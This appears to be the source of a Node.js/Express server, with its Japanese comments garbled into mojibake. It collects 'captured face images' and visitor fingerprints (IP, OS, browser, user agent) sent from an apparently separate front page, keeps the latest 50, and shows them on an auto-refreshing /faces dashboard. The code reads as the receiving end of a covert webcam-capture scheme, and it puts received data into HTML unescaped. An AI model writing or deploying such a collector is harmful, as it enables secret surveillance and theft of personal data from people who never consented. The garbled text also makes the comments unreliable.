const express = require('express');const cors = require('cors');const app = express();const port = 3000;// „É°„É¢„É™‰∏ä„Å´ÁîªÂÉè„Çí‰øùÂ≠ò„Åô„ÇãÈÖçÂàólet capturedFaces = [];// CORSË®≠ÂÆöapp.use(cors({    origin: '*',    methods: ['GET', 'POST'],    allowedHeaders: ['Content-Type']}));// JSON„Éë„Éº„Çπ„Éü„Éâ„É´„Ç¶„Çß„Ç¢app.use(express.json({ limit: '50mb' }));// ÈùôÁöÑ„Éï„Ç°„Ç§„É´ÈÖç‰ø°app.use(express.static('.'));// È°îÁîªÂÉè„ÇíÂèó‰ø°„Åô„Çã„Ç®„É≥„Éâ„Éù„Ç§„É≥„Éàapp.post('/capture', (req, res) => {    try {        const { images, system_info, timestamp } = req.body;                // Êñ∞„Åó„ÅÑ„Ç≠„É£„Éó„ÉÅ„É£„Éá„Éº„Çø„ÇíËøΩÂä†        const captureData = {            id: Date.now(),            timestamp: timestamp || new Date().toISOString(),            images: images || [],            system_info: system_info || {},            capture_count: images ? images.length : 0        };                capturedFaces.push(captureData);                // ÊúÄÊñ∞„ÅÆ50‰ª∂„ÅÆ„Åø‰øùÊåÅ        if (capturedFaces.length > 50) {            capturedFaces = capturedFaces.slice(-50);        }                console.log(`Êñ∞„Åó„ÅÑÈ°îÁîªÂÉè„ÇíÂèó‰ø°: ${captureData.capture_count}Êûö, IP: ${system_info.ip_address}`);                res.json({             success: true,             message: 'ÁîªÂÉè„ÇíÊ≠£Â∏∏„Å´Âèó‰ø°„Åó„Åæ„Åó„Åü',            id: captureData.id        });    } catch (error) {        console.error('ÁîªÂÉèÂèó‰ø°„Ç®„É©„Éº:', error);        res.status(500).json({             success: false,             error: 'ÁîªÂÉè„ÅÆ‰øùÂ≠ò„Å´Â§±Êïó„Åó„Åæ„Åó„Åü'         });    }});// È°îÁîªÂÉè„ÇíË°®Á§∫„Åô„Çã„Ç®„É≥„Éâ„Éù„Ç§„É≥„Éàapp.get('/faces', (req, res) => {    const html = `    <!DOCTYPE html>    <html lang="ja">    <head>        <meta charset="UTF-8">        <meta name="viewport" content="width=device-width, initial-scale=1.0">        <title>„Ç≠„É£„Éó„ÉÅ„É£„Åï„Çå„ÅüÈ°îÁîªÂÉè</title>        <style>            body {                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;                margin: 0;                padding: 20px;                background-color: #f5f5f5;            }            .container {                max-width: 1200px;                margin: 0 auto;            }            h1 {                color: #333;                text-align: center;                margin-bottom: 30px;            }            .stats {                background: white;                padding: 20px;                border-radius: 8px;                margin-bottom: 30px;                box-shadow: 0 2px 4px rgba(0,0,0,0.1);            }            .capture-item {                background: white;                border-radius: 8px;                padding: 20px;                margin-bottom: 20px;                box-shadow: 0 2px 4px rgba(0,0,0,0.1);            }            .capture-header {                display: flex;                justify-content: space-between;                align-items: center;                margin-bottom: 15px;                padding-bottom: 10px;                border-bottom: 1px solid #eee;            }            .capture-time {                font-weight: bold;                color: #f48120;            }            .capture-info {                font-size: 14px;                color: #666;            }            .images-container {                display: flex;                gap: 15px;                flex-wrap: wrap;                margin-bottom: 15px;            }            .image-item {                text-align: center;            }            .image-item img {                max-width: 200px;                max-height: 200px;                border-radius: 8px;                border: 2px solid #f48120;                object-fit: cover;            }            .image-label {                font-size: 12px;                color: #666;                margin-top: 5px;            }            .system-info {                background: #f8f9fa;                padding: 15px;                border-radius: 6px;                font-size: 13px;                line-height: 1.6;            }            .system-info h4 {                margin: 0 0 10px 0;                color: #333;            }            .info-grid {                display: grid;                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));                gap: 10px;            }            .no-data {                text-align: center;                color: #666;                font-style: italic;                padding: 50px;            }            .refresh-btn {                position: fixed;                top: 20px;                right: 20px;                background: #f48120;                color: white;                border: none;                padding: 10px 20px;                border-radius: 6px;                cursor: pointer;                font-size: 14px;            }            .refresh-btn:hover {                background: #e06a00;            }        </style>    </head>    <body>        <div class="container">            <h1>üîç „Ç≠„É£„Éó„ÉÅ„É£„Åï„Çå„ÅüÈ°îÁîªÂÉè</h1>                        <div class="stats">                <h3>Áµ±Ë®àÊÉÖÂ†±</h3>                <p>Á∑è„Ç≠„É£„Éó„ÉÅ„É£Êï∞: <strong>${capturedFaces.length}</strong></p>                <p>ÊúÄÁµÇÊõ¥Êñ∞: <strong>${capturedFaces.length > 0 ? new Date(capturedFaces[capturedFaces.length - 1].timestamp).toLocaleString('ja-JP') : '„Å™„Åó'}</strong></p>            </div>                        <button class="refresh-btn" onclick="location.reload()">üîÑ Êõ¥Êñ∞</button>                        ${capturedFaces.length === 0 ?                 '<div class="no-data">„Åæ„Å†„Ç≠„É£„Éó„ÉÅ„É£„Åï„Çå„ÅüÁîªÂÉè„Åå„ÅÇ„Çä„Åæ„Åõ„Çì</div>' :                capturedFaces.slice().reverse().map(capture => `                    <div class="capture-item">                        <div class="capture-header">                            <div class="capture-time">                                ${new Date(capture.timestamp).toLocaleString('ja-JP')}                            </div>                            <div class="capture-info">                                ID: ${capture.id} | ÁîªÂÉèÊï∞: ${capture.capture_count}Êûö                            </div>                        </div>                                                <div class="images-container">                            ${capture.images.map((image, index) => `                                <div class="image-item">                                    <img src="${image}" alt="„Ç≠„É£„Éó„ÉÅ„É£ÁîªÂÉè ${index + 1}" />                                    <div class="image-label">ÁîªÂÉè ${index + 1}</div>                                </div>                            `).join('')}                        </div>                                                <div class="system-info">                            <h4>„Ç∑„Çπ„ÉÜ„É†ÊÉÖÂ†±</h4>                            <div class="info-grid">                                <div><strong>IP:</strong> ${capture.system_info.ip_address || 'Unknown'}</div>                                <div><strong>OS:</strong> ${capture.system_info.os || 'Unknown'}</div>                                <div><strong>„Éñ„É©„Ç¶„Ç∂:</strong> ${capture.system_info.browser || 'Unknown'}</div>                                <div><strong>Ëß£ÂÉèÂ∫¶:</strong> ${capture.system_info.screen_resolution || 'Unknown'}</div>                                <div><strong>Ë®ÄË™û:</strong> ${capture.system_info.language || 'Unknown'}</div>                                <div><strong>„Çø„Ç§„É†„Çæ„Éº„É≥:</strong> ${capture.system_info.timezone || 'Unknown'}</div>                            </div>                            <div style="margin-top: 10px;">                                <strong>User-Agent:</strong> ${capture.system_info.user_agent || 'Unknown'}                            </div>                        </div>                    </div>                `).join('')            }        </div>                <script>            // 30Áßí„Åî„Å®„Å´Ëá™ÂãïÊõ¥Êñ∞            setInterval(() => {                location.reload();            }, 30000);        </script>    </body>    </html>    `;        res.send(html);});app.listen(port, () => {    console.log(`üöÄ „Çµ„Éº„Éê„Éº„ÅåËµ∑Âãï„Åó„Åæ„Åó„Åü: http://localhost:${port}`);    console.log(`üì∏ È°îÁîªÂÉèÁ¢∫Ë™ç: http://localhost:${port}/faces`);    console.log(`üè† „É°„Ç§„É≥„Çµ„Ç§„Éà: http://localhost:${port}/index.html`);});